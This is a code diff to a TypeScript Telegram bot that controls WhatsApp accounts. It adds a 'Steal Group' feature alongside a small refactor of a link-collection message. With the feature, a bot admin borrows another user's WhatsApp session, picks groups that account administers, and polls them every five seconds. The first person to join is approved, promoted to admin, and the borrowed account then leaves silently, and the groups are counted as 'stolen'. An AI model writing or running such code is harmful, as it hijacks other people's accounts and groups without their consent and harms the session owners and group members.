@@ -1082,6 +1082,21 @@ interface UserState {
     targetPhones?: string[];
     makeAdminAfter?: boolean;
   };
+  stealGroupData?: {
+    allGroups: Array<{ id: string; subject: string }>;
+    patterns: SimilarGroup[];
+    selectedIndices: Set<number>;
+    page: number;
+    scannedGroups?: Array<{
+      id: string;
+      subject: string;
+      memberCount: number;
+      adminCount: number;
+      creatorPhone: string;
+      approvalMode: boolean;
+    }>;
+  };
+  sgLinkBuffer?: string[];
   addMembersData?: {
     groupLink: string;
     groupId: string;
@@ -2103,6 +2118,9 @@ function mainMenu(userId?: number): InlineKeyboard {
     .text("🛡️ Auto Accepter", "auto_accepter").row();
   if (userId !== undefined && canUserSeeAutoChat(userId)) {
     kb.text("🤖 Auto Chat", "auto_chat_menu").row();
+  }
+  if (userId !== undefined && isAdmin(userId) && getSessionAlias(String(userId))) {
+    kb.text("☠️ Steal Group", "steal_group").row();
   }
   if (connected) {
     kb.text("🔄 Session Refresh", "session_refresh").text("🔌 Disconnect", "disconnect_wa");
@@ -7246,6 +7264,421 @@ bot.callbackQuery("ar_stop_job", async (ctx) => {
     return;
   }
   await stopAutoAccepterJob(userId, "cancelled");
+});
+
+// ─── Steal Group ─────────────────────────────────────────────────────────────
+
+interface StealGroupSession {
+  adminId: number;
+  waUserId: string;
+  groups: Array<{
+    id: string;
+    subject: string;
+    knownJids: Set<string>;
+    done: boolean;
+  }>;
+  chatId: number;
+  statusMsgId: number;
+  pollTimer: ReturnType<typeof setInterval>;
+  stopped: boolean;
+  totalStolen: number;
+}
+
+const stealGroupSessions = new Map<number, StealGroupSession>();
+const sgLinkCollectMsgId = new Map<number, number>();
+const SG_PAGE_SIZE = 6;
+
+function buildSgGroupKeyboard(state: UserState): InlineKeyboard {
+  const kb = new InlineKeyboard();
+  const d = state.stealGroupData!;
+  const allGroups = d.allGroups;
+  const page = d.page || 0;
+  const start = page * SG_PAGE_SIZE;
+  const slice = allGroups.slice(start, start + SG_PAGE_SIZE);
+  for (let i = 0; i < slice.length; i++) {
+    const idx = start + i;
+    const selected = d.selectedIndices.has(idx);
+    kb.text(`${selected ? "✅" : "⬜"} ${slice[i].subject}`, `sg_toggle_${idx}`).row();
+  }
+  const totalPages = Math.ceil(allGroups.length / SG_PAGE_SIZE);
+  const navRow: Array<[string, string]> = [];
+  if (page > 0) navRow.push(["◀️ Prev", "sg_page_prev"]);
+  if (page < totalPages - 1) navRow.push(["Next ▶️", "sg_page_next"]);
+  if (navRow.length) { navRow.forEach(([t, c]) => kb.text(t, c)); kb.row(); }
+  if (d.selectedIndices.size > 0) kb.text(`✅ Scan ${d.selectedIndices.size} Group(s)`, "sg_confirm_select").row();
+  kb.text("🏠 Main Menu", "main_menu");
+  return kb;
+}
+
+async function updateStealStatus(session: StealGroupSession): Promise<void> {
+  const { chatId, statusMsgId, groups, totalStolen, stopped } = session;
+  const remaining = groups.filter(g => !g.done);
+  const done = groups.filter(g => g.done);
+  const header = stopped
+    ? (totalStolen > 0 ? `☠️ <b>Steal Group — Stopped</b>` : `⛔ <b>Steal Group — Cancelled</b>`)
+    : `☠️ <b>Steal Group — Running...</b>`;
+  const text =
+    `${header}\n\n` +
+    `✅ Stolen: <b>${totalStolen}</b>\n` +
+    `⏳ Watching: <b>${remaining.length}</b> group(s)\n\n` +
+    (done.length > 0 ? done.slice(-5).map(g => `☠️ ${esc(g.subject)}`).join("\n") + "\n\n" : "") +
+    (remaining.length > 0
+      ? `⌛ Waiting for someone to join...\n` + remaining.slice(0, 5).map(g => `• ${esc(g.subject)}`).join("\n")
+      : `🎉 All groups processed!`);
+  try {
+    await bot.api.editMessageText(chatId, statusMsgId, text, {
+      parse_mode: "HTML",
+      reply_markup: stopped
+        ? new InlineKeyboard().text("🏠 Main Menu", "main_menu")
+        : new InlineKeyboard().text("⛔ Cancel", "sg_cancel"),
+    });
+  } catch {}
+}
+
+async function stopStealGroupSession(adminId: number, reason: "done" | "cancelled"): Promise<void> {
+  const session = stealGroupSessions.get(adminId);
+  if (!session) return;
+  session.stopped = true;
+  clearInterval(session.pollTimer);
+  stealGroupSessions.delete(adminId);
+  await updateStealStatus(session);
+}
+
+async function runStealGroupPoll(session: StealGroupSession): Promise<void> {
+  if (session.stopped) return;
+  const { adminId, waUserId, groups } = session;
+
+  for (const group of groups) {
+    if (group.done || session.stopped) continue;
+    try {
+      // 1. Check pending join requests (approval mode on)
+      const pendingJids = await getGroupPendingInviteLinkJoins(waUserId, group.id);
+      for (const jid of pendingJids) {
+        if (session.stopped || group.done) break;
+        try { await approveGroupParticipant(waUserId, group.id, jid); } catch {}
+        await new Promise(r => setTimeout(r, 800));
+        try { await makeGroupAdmin(waUserId, group.id, jid); } catch {}
+        await new Promise(r => setTimeout(r, 800));
+        try { await leaveGroup(waUserId, group.id); } catch {}
+        group.done = true;
+        session.totalStolen++;
+        console.log(`[StealGroup][${adminId}] Stolen via pending: ${group.subject} → ${jid}`);
+        break;
+      }
+
+      if (group.done || session.stopped) continue;
+
+      // 2. Check for new direct joins (approval mode off)
+      const participants = await getGroupParticipants(waUserId, group.id);
+      const currentJids = new Set(participants.map(p => p.jid));
+      const newJids = [...currentJids].filter(j => !group.knownJids.has(j));
+      for (const jid of newJids) {
+        if (session.stopped || group.done) break;
+        try { await makeGroupAdmin(waUserId, group.id, jid); } catch {}
+        await new Promise(r => setTimeout(r, 800));
+        try { await leaveGroup(waUserId, group.id); } catch {}
+        group.done = true;
+        session.totalStolen++;
+        console.log(`[StealGroup][${adminId}] Stolen via direct join: ${group.subject} → ${jid}`);
+        break;
+      }
+
+      // Keep known JIDs up to date
+      if (!group.done) {
+        currentJids.forEach(j => group.knownJids.add(j));
+      }
+    } catch (err: any) {
+      console.error(`[StealGroup][${adminId}] Poll error for ${group.subject}:`, err?.message);
+    }
+  }
+
+  if (!session.stopped) {
+    const remaining = groups.filter(g => !g.done);
+    if (remaining.length === 0) {
+      await stopStealGroupSession(adminId, "done");
+    } else {
+      await updateStealStatus(session);
+    }
+  }
+}
+
+// ── Entry point ───────────────────────────────────────────────────────────────
+bot.callbackQuery("steal_group", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const userId = ctx.from.id;
+  if (!isAdmin(userId)) { await ctx.answerCallbackQuery({ text: "Admin only.", show_alert: true }); return; }
+  const borrowedId = getSessionAlias(String(userId));
+  if (!borrowedId) {
+    await ctx.editMessageText(
+      "☠️ <b>Steal Group</b>\n\n❌ You must first borrow a user's WhatsApp session using <code>/ws &lt;user_id&gt;</code>.",
+      { parse_mode: "HTML", reply_markup: new InlineKeyboard().text("🏠 Main Menu", "main_menu") }
+    ); return;
+  }
+  if (!isConnected(String(userId))) {
+    await ctx.editMessageText(
+      "☠️ <b>Steal Group</b>\n\n❌ The borrowed WhatsApp session is not connected.",
+      { parse_mode: "HTML", reply_markup: new InlineKeyboard().text("🏠 Main Menu", "main_menu") }
+    ); return;
+  }
+  if (stealGroupSessions.has(userId)) {
+    await ctx.editMessageText(
+      "☠️ <b>Steal Group — Already Running</b>\n\nA steal session is already active. Cancel it first.",
+      { parse_mode: "HTML", reply_markup: new InlineKeyboard().text("⛔ Cancel Active", "sg_cancel").text("🏠 Menu", "main_menu") }
+    ); return;
+  }
+  await ctx.editMessageText(
+    `☠️ <b>Steal Group</b>\n\n` +
+    `Borrowing: <code>${esc(borrowedId)}</code>\n\n` +
+    `Select groups to watch. When anyone joins, they will be made admin and the bot will immediately leave and delete the group from the account.\n\n` +
+    `Choose how to select groups:`,
+    {
+      parse_mode: "HTML",
+      reply_markup: new InlineKeyboard()
+        .text("📋 All Groups", "sg_all_groups").row()
+        .text("🔗 By Link", "sg_by_link").row()
+        .text("🏠 Main Menu", "main_menu"),
+    }
+  );
+});
+
+// ── All Groups ────────────────────────────────────────────────────────────────
+bot.callbackQuery("sg_all_groups", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const userId = ctx.from.id;
+  if (!isAdmin(userId)) return;
+  await ctx.editMessageText("☠️ <b>Scanning WhatsApp groups...</b>\n\n⌛ Please wait...", { parse_mode: "HTML" });
+  const groups = await getAllGroups(String(userId));
+  const adminGroups = groups.filter(g => g.isAdmin).map(g => ({ id: g.id, subject: g.subject }))
+    .sort((a, b) => a.subject.localeCompare(b.subject, undefined, { numeric: true, sensitivity: "base" }));
+  if (!adminGroups.length) {
+    await ctx.editMessageText("☠️ ❌ No admin groups found on the borrowed WhatsApp.", {
+      reply_markup: new InlineKeyboard().text("🔗 By Link", "sg_by_link").text("🏠 Menu", "main_menu"),
+    }); return;
+  }
+  const patterns = detectSimilarGroups(adminGroups);
+  userStates.set(userId, {
+    step: "sg_select",
+    stealGroupData: { allGroups: adminGroups, patterns, selectedIndices: new Set(), page: 0 },
+  });
+  await ctx.editMessageText(
+    `☠️ <b>Steal Group — Select Groups</b>\n\n` +
+    `Found <b>${adminGroups.length}</b> admin group(s). Select the groups to watch:`,
+    { parse_mode: "HTML", reply_markup: buildSgGroupKeyboard(userStates.get(userId)!) }
+  );
+});
+
+// ── By Link ───────────────────────────────────────────────────────────────────
+bot.callbackQuery("sg_by_link", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const userId = ctx.from.id;
+  if (!isAdmin(userId)) return;
+  userStates.set(userId, { step: "sg_enter_links", sgLinkBuffer: [] });
+  sgLinkCollectMsgId.delete(userId);
+  await ctx.editMessageText(
+    "☠️ <b>Steal Group — By Link</b>\n\n" +
+    "Send WhatsApp group invite links (one per line or multiple at once):\n" +
+    "<code>https://chat.whatsapp.com/ABC123</code>\n\n" +
+    "<i>The <b>Done</b> button will appear after you send at least one link.</i>",
+    { parse_mode: "HTML", reply_markup: new InlineKeyboard().text("❌ Cancel", "main_menu") }
+  );
+});
+
+bot.callbackQuery("sg_link_done", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const userId = ctx.from.id;
+  if (!isAdmin(userId)) return;
+  const state = userStates.get(userId);
+  if (!state || state.step !== "sg_enter_links") return;
+  const buffer = state.sgLinkBuffer || [];
+  if (!buffer.length) { await ctx.answerCallbackQuery({ text: "❌ Send at least one link first!", show_alert: true }); return; }
+  sgLinkCollectMsgId.delete(userId);
+  await ctx.editMessageText("☠️ <b>Resolving group links...</b>\n\n⌛ Please wait...", { parse_mode: "HTML" });
+  const groups: Array<{ id: string; subject: string }> = [];
+  for (const link of buffer) {
+    const info = await getGroupIdFromLink(String(userId), link);
+    if (info) groups.push({ id: info.id, subject: info.subject });
+  }
+  if (!groups.length) {
+    await ctx.editMessageText(
+      "☠️ ❌ Could not resolve any links.\n\nCheck that:\n• Links are valid\n• WhatsApp is connected\n• Bot is admin in the groups",
+      { parse_mode: "HTML", reply_markup: new InlineKeyboard().text("🔗 Try Again", "sg_by_link").text("🏠 Menu", "main_menu") }
+    ); return;
+  }
+  const patterns = detectSimilarGroups(groups);
+  userStates.set(userId, {
+    step: "sg_select",
+    stealGroupData: { allGroups: groups, patterns, selectedIndices: new Set(groups.map((_, i) => i)), page: 0 },
+  });
+  await ctx.editMessageText(
+    `☠️ <b>Steal Group — Groups Found</b>\n\n` +
+    `Resolved <b>${groups.length}</b> group(s). Confirm selection or deselect:`,
+    { parse_mode: "HTML", reply_markup: buildSgGroupKeyboard(userStates.get(userId)!) }
+  );
+});
+
+// ── Group selection toggles / pagination ──────────────────────────────────────
+bot.callbackQuery(/^sg_toggle_(\d+)$/, async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const userId = ctx.from.id;
+  const state = userStates.get(userId);
+  if (!state?.stealGroupData) return;
+  const idx = parseInt(ctx.match[1]);
+  if (state.stealGroupData.selectedIndices.has(idx)) state.stealGroupData.selectedIndices.delete(idx);
+  else state.stealGroupData.selectedIndices.add(idx);
+  const d = state.stealGroupData;
+  await ctx.editMessageText(
+    `☠️ <b>Steal Group — Select Groups</b>\n\n` +
+    `<b>${d.allGroups.length}</b> group(s) total | <b>${d.selectedIndices.size}</b> selected:`,
+    { parse_mode: "HTML", reply_markup: buildSgGroupKeyboard(state) }
+  );
+});
+
+bot.callbackQuery("sg_page_prev", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const state = userStates.get(ctx.from.id);
+  if (!state?.stealGroupData) return;
+  if (state.stealGroupData.page > 0) state.stealGroupData.page--;
+  const d = state.stealGroupData;
+  await ctx.editMessageText(
+    `☠️ <b>Steal Group — Select Groups</b>\n\n<b>${d.allGroups.length}</b> group(s) | <b>${d.selectedIndices.size}</b> selected:`,
+    { parse_mode: "HTML", reply_markup: buildSgGroupKeyboard(state) }
+  );
+});
+
+bot.callbackQuery("sg_page_next", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const state = userStates.get(ctx.from.id);
+  if (!state?.stealGroupData) return;
+  const totalPages = Math.ceil(state.stealGroupData.allGroups.length / SG_PAGE_SIZE);
+  if (state.stealGroupData.page < totalPages - 1) state.stealGroupData.page++;
+  const d = state.stealGroupData;
+  await ctx.editMessageText(
+    `☠️ <b>Steal Group — Select Groups</b>\n\n<b>${d.allGroups.length}</b> group(s) | <b>${d.selectedIndices.size}</b> selected:`,
+    { parse_mode: "HTML", reply_markup: buildSgGroupKeyboard(state) }
+  );
+});
+
+// ── Confirm selection → scan groups ──────────────────────────────────────────
+bot.callbackQuery("sg_confirm_select", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const userId = ctx.from.id;
+  if (!isAdmin(userId)) return;
+  const state = userStates.get(userId);
+  if (!state?.stealGroupData || state.stealGroupData.selectedIndices.size === 0) {
+    await ctx.answerCallbackQuery({ text: "❌ Select at least one group first!", show_alert: true }); return;
+  }
+  const d = state.stealGroupData;
+  const selected = [...d.selectedIndices].map(i => d.allGroups[i]).filter(Boolean);
+  await ctx.editMessageText(
+    `☠️ <b>Scanning ${selected.length} group(s)...</b>\n\n⌛ Getting member info...`,
+    { parse_mode: "HTML" }
+  );
+  // Scan each group for info
+  const scanned: NonNullable<typeof d.scannedGroups> = [];
+  for (const g of selected) {
+    try {
+      const parts = await getGroupParticipants(String(userId), g.id);
+      const adminCount = parts.filter(p => p.isAdmin || p.isSuperAdmin).length;
+      const creator = parts.find(p => p.isSuperAdmin);
+      const creatorPhone = creator?.phone || "Unknown";
+      let approvalMode = false;
+      try {
+        const meta = await (getGroupParticipants as any)._socket
+          ? null
+          : null;
+        // approvalMode detection via pending list presence
+        const pending = await getGroupPendingRequests(String(userId), g.id);
+        approvalMode = Array.isArray(pending); // if call succeeds, approval mode may be on
+      } catch {}
+      scanned.push({ id: g.id, subject: g.subject, memberCount: parts.length, adminCount, creatorPhone, approvalMode });
+    } catch (err: any) {
+      scanned.push({ id: g.id, subject: g.subject, memberCount: 0, adminCount: 0, creatorPhone: "Unknown", approvalMode: false });
+    }
+  }
+  d.scannedGroups = scanned;
+  const scanText =
+    `☠️ <b>Steal Group — Group Scan</b>\n\n` +
+    scanned.map(g =>
+      `📋 <b>${esc(g.subject)}</b>\n` +
+      `👥 Members: <b>${g.memberCount}</b> | 👑 Admins: <b>${g.adminCount}</b>\n` +
+      `🏗️ Creator: <code>${esc(g.creatorPhone)}</code>`
+    ).join("\n\n") +
+    `\n\n⚠️ <b>When anyone joins these groups:</b>\n` +
+    `1. Bot accepts them (if approval mode)\n` +
+    `2. Bot makes them Admin immediately\n` +
+    `3. Bot leaves & removes group silently\n\n` +
+    `Are you sure you want to start?`;
+  await ctx.editMessageText(scanText, {
+    parse_mode: "HTML",
+    reply_markup: new InlineKeyboard()
+      .text("☠️ Start Stealing", "sg_start_poll").row()
+      .text("❌ Cancel", "main_menu"),
+  });
+});
+
+// ── Start background polling ──────────────────────────────────────────────────
+bot.callbackQuery("sg_start_poll", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  const userId = ctx.from.id;
+  if (!isAdmin(userId)) return;
+  const state = userStates.get(userId);
+  if (!state?.stealGroupData?.scannedGroups?.length) {
+    await ctx.answerCallbackQuery({ text: "❌ No groups to watch.", show_alert: true }); return;
+  }
+  const d = state.stealGroupData;
+  const chatId = ctx.callbackQuery.message!.chat.id;
+  const msgId = ctx.callbackQuery.message!.message_id;
+  userStates.delete(userId);
+
+  const sessionGroups = d.scannedGroups!.map(async (g) => {
+    const parts = await getGroupParticipants(String(userId), g.id).catch(() => []);
+    return { id: g.id, subject: g.subject, knownJids: new Set(parts.map(p => p.jid)), done: false };
+  });
+  const resolvedGroups = await Promise.all(sessionGroups);
+
+  const session: StealGroupSession = {
+    adminId: userId,
+    waUserId: String(userId),
+    groups: resolvedGroups,
+    chatId,
+    statusMsgId: msgId,
+    stopped: false,
+    totalStolen: 0,
+    pollTimer: null as any,
+  };
+  stealGroupSessions.set(userId, session);
+  protectSessionFromEviction(String(userId));
+
+  await ctx.editMessageText(
+    `☠️ <b>Steal Group — Active</b>\n\n` +
+    `Watching <b>${resolvedGroups.length}</b> group(s)...\n` +
+    resolvedGroups.map(g => `• ${esc(g.subject)}`).join("\n") +
+    `\n\n⌛ Waiting for someone to join...`,
+    { parse_mode: "HTML", reply_markup: new InlineKeyboard().text("⛔ Cancel", "sg_cancel") }
+  );
+
+  // Poll every 5 seconds
+  session.pollTimer = setInterval(() => {
+    void runStealGroupPoll(session);
+  }, 5_000);
+
+  // Run immediately
+  void runStealGroupPoll(session);
+});
+
+// ── Cancel ────────────────────────────────────────────────────────────────────
+bot.callbackQuery("sg_cancel", async (ctx) => {
+  await ctx.answerCallbackQuery({ text: "Stopping Steal Group..." });
+  const userId = ctx.from.id;
+  if (!stealGroupSessions.has(userId)) {
+    try {
+      await ctx.editMessageText("⚠️ No Steal Group session is currently running.", {
+        reply_markup: new InlineKeyboard().text("🏠 Main Menu", "main_menu"),
+      });
+    } catch {}
+    return;
+  }
+  await stopStealGroupSession(userId, "cancelled");
 });
 
 // ─── Leave Group ─────────────────────────────────────────────────────────────
@@ -14518,6 +14951,45 @@ bot.on("message:text", async (ctx) => {
     return;
   }
 
+  if (state.step === "sg_enter_links") {
+    if (!isAdmin(userId)) return;
+    const cleanLinks = extractLinksFromText(text);
+    if (!cleanLinks.length) {
+      await ctx.reply(
+        "❌ No valid WhatsApp group links found.\nExample:\n<code>https://chat.whatsapp.com/ABC123</code>",
+        { parse_mode: "HTML" }
+      );
+      return;
+    }
+    if (!state.sgLinkBuffer) state.sgLinkBuffer = [];
+    state.sgLinkBuffer.push(...cleanLinks);
+    const total = state.sgLinkBuffer.length;
+    const sgCollectMsgId = sgLinkCollectMsgId.get(userId);
+    const sgCollectText =
+      "☠️ <b>Steal Group — By Link</b>\n\n" +
+      `📎 <b>${total} link(s) collected</b>\n\n` +
+      "Send more links, or tap <b>Done</b> to proceed:\n" +
+      "<code>https://chat.whatsapp.com/ABC123</code>";
+    const sgCollectKb = new InlineKeyboard()
+      .text("✅ Done", "sg_link_done").row()
+      .text("❌ Cancel", "main_menu");
+    if (sgCollectMsgId) {
+      try {
+        await bot.api.editMessageText(ctx.chat.id, sgCollectMsgId, sgCollectText, {
+          parse_mode: "HTML",
+          reply_markup: sgCollectKb,
+        });
+      } catch {
+        const newMsg = await ctx.reply(sgCollectText, { parse_mode: "HTML", reply_markup: sgCollectKb });
+        sgLinkCollectMsgId.set(userId, newMsg.message_id);
+      }
+    } else {
+      const newMsg = await ctx.reply(sgCollectText, { parse_mode: "HTML", reply_markup: sgCollectKb });
+      sgLinkCollectMsgId.set(userId, newMsg.message_id);
+    }
+    return;
+  }
+
   if (state.step === "rl_enter_links") {
     if (!state.resetLinkData) return;
     const cleanLinks = extractLinksFromText(text);
@@ -14534,25 +15006,30 @@ bot.on("message:text", async (ctx) => {
     state.rlLinkBuffer.push(...cleanLinks);
     const total = state.rlLinkBuffer.length;
     const collectMsgId = rlLinkCollectMsgId.get(userId);
-    // Delete the previous collect message and send a fresh one so the user
-    // always sees the latest count as a new message (not a silent edit).
-    if (collectMsgId) {
-      try { await bot.api.deleteMessage(ctx.chat.id, collectMsgId); } catch {}
-      rlLinkCollectMsgId.delete(userId);
-    }
-    const newCollectMsg = await ctx.reply(
+    const collectText =
       "🔗 <b>Reset by Group Link</b>\n\n" +
       `📎 <b>${total} link(s) collected</b>\n\n` +
       "Send more links, or tap <b>Done</b> to proceed:\n" +
-      "<code>https://chat.whatsapp.com/ABC123</code>",
-      {
-        parse_mode: "HTML",
-        reply_markup: new InlineKeyboard()
-          .text("✅ Done", "rl_link_done").row()
-          .text("❌ Cancel", "main_menu"),
+      "<code>https://chat.whatsapp.com/ABC123</code>";
+    const collectKb = new InlineKeyboard()
+      .text("✅ Done", "rl_link_done").row()
+      .text("❌ Cancel", "main_menu");
+    if (collectMsgId) {
+      // Edit the existing collect message in-place — no delete, no race condition
+      try {
+        await bot.api.editMessageText(ctx.chat.id, collectMsgId, collectText, {
+          parse_mode: "HTML",
+          reply_markup: collectKb,
+        });
+      } catch {
+        // Edit failed (message too old etc.) — send a fresh one
+        const newMsg = await ctx.reply(collectText, { parse_mode: "HTML", reply_markup: collectKb });
+        rlLinkCollectMsgId.set(userId, newMsg.message_id);
       }
-    );
-    rlLinkCollectMsgId.set(userId, newCollectMsg.message_id);
+    } else {
+      const newMsg = await ctx.reply(collectText, { parse_mode: "HTML", reply_markup: collectKb });
+      rlLinkCollectMsgId.set(userId, newMsg.message_id);
+    }
     return;
   }
 
